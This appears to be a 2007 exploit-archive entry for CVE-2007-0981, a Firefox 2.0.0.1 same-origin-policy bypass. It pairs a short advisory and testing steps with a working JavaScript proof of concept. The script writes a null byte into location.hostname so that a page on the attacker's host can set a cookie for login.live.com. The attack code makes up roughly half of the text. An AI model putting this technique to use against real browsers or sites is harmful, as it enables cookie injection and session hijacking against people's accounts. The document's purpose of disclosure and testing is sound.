Mozilla Firefox <= 2.0.0.1 (location.hostname) Cross-Domain Vulnerability
=========================================================================

<!--
________________________________________________________________________________
  
Mozilla Firefox &#039;location.hostname&#039; Cross-Domain Vulnerability
________________________________________________________________________________

Software      : Mozilla Firefox version 2.0.0.1 and prior 
CVE reference : CVE-2007-0981
Impact        : Security Bypass
Risk          : Moderate
Discovered by : Michal Zalewski (http://lcamtuf.coredump.cx/)
Advisory Date	: 2007-02-15

Mozilla Firefox allows remote attackers to bypass the same origin policy, steal
cookies, and conduct other attacks by writing a URI with a null byte to the
hostname (location.hostname) DOM property, due to interactions with DNS
resolver code.

Links
http://lcamtuf.dione.cc/ffhostname.html (test)
https://bugzilla.mozilla.org/show_bug.cgi?id=370445
________________________________________________________________________________

How To Test Your Browser ?
1 - Execute this on your local web server (or change variable &#039;mydomain&#039;)
2 - Go to the link &#039;http://login.live.com/&#039; and read the login
    (or check Tools -> Options -> Privacy -> Show Cookies for login.live.com)
________________________________________________________________________________

Gorn, gorn.support[gmail]com
2007-02-19 16:00

-->

<script language="javascript"> 
var mydomain = &#039;127.0.0.1&#039;;
var var_cook = &#039;MSPPre=firefox_vulnerability_test&#039;;
var dom_cook = &#039;login.live.com&#039;;

if (location.hostname == mydomain)
{
  try { location.hostname = mydomain + &#039;\x00www.&#039; + dom_cook; } 
  catch (err) { alert(&#039;Failed to modify location.hostname&#039;); }
} else {
  document.cookie = var_cook + &#039;; domain=.&#039; + dom_cook + &#039;; path=/;&#039;;  
}
</script>


